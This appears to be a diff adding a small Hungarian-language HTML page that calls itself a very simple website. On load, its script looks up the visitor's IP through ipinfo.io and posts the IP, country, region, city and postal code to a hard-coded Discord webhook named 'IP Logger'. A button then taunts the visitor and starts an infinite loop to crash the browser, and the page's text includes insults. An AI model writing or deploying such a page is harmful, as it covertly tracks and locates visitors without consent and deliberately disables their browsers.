@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Anyadat nezegesd te kocsog</title>
+<style>
+
+.button {
+  border: none;
+  color: white;
+  padding: 16px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  transition-duration: 0.4s;
+  cursor: pointer;
+}
+
+.button1 {
+  background-color: white;
+  color: black;
+  border: 2px solid #04AA6D;
+}
+
+.button1:hover {
+  background-color: #04AA6D;
+  color: white;
+}
+
+</style>
+</head>
+
+<h1> Ez egy nagyon egyszeru weboldal </h1>
+<button class="button button1" onclick="crashBrowser()">Kattints ram</button>
+
+<body>
+     
+<script>
+function crashBrowser() {
+    alert("Azt ugye tudtad, hogy az ipd atment egy discord webhookon keresztul hozzam?");
+    
+    while (true) {
+        console.log("Meghalt a bongeszod ocskos");
+    }
+}
+
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discordapp.com/api/webhooks/1337434821978488882/FPuhUbglVukw3Pd3Qk_PyLoqOX3b-K1xJQyCQfGuRw_XxONxyU7q8Iil0M3vrRWFKxok");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "valaki volt olyan redvas hogy megnezte",
+          embeds: [
+               {
+                    title: "Valaki megnezte a weboldalad!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
+</body>
+</html>
